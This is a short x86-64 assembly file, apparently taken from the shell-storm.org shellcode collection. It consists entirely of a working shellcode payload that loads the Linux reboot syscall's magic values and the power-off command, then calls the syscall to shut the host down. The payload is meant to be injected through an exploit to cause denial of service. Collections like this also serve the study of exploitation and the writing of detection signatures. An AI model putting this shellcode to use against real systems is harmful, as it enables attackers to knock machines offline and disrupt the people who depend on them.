; http://shell-storm.org/shellcode/files/shellcode-602.php 

global _start

section .text

_start:

xor rdx, rdx 
xor rsi, rsi 
xor rdi, rdi 

push  0x4321fedc ; reboot cmd power off 
pop rdx
push  0x28121969 ; reboot magic 2
pop     rsi 

mov edi , 0xfee1dead ; reboot magic 1

xor rax, rax
push  0xa9     ; reboot syscall 
pop rax

syscall
